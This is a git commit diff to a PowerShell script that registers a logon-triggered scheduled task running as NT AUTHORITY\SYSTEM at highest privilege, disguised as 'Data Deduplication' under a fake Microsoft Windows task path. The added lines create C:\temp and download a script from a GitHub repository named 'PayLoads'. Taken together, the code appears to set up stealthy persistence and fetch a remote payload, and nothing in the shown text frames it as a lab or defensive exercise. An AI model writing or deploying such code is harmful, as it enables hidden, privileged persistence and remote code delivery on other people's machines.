7bf6d691d836a3918c4a30b9e04efc71c7164997
philcharlesjackson <129542744+philcharlesjackson@users.noreply.github.com>
2023-06-05 17:17:03 +0100

    Update scheduled task ps.ps1

--- scheduled task ps.ps1
+++ scheduled task ps.ps1
@@ -3,3 +3,10 @@ $Trigger = New-ScheduledTaskTrigger -AtLogon
 $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -Priority 7 -ExecutionTimeLimit (New-TimeSpan -Hours 4)
 $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 $Task = Register-ScheduledTask -TaskName "Data Deduplication" -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -TaskPath "\Microsoft\Windows\temmp" -Force -ErrorAction Stop
+
+New-Item -ItemType Directory -Path "C:\temp"
+
+$url = "https://raw.githubusercontent.com/philcharlesjackson/PayLoads/main/newfolderscript.ps1"
+$output = "C:\temp\script.ps1"
+Invoke-WebRequest -Uri $url -OutFile $output
+
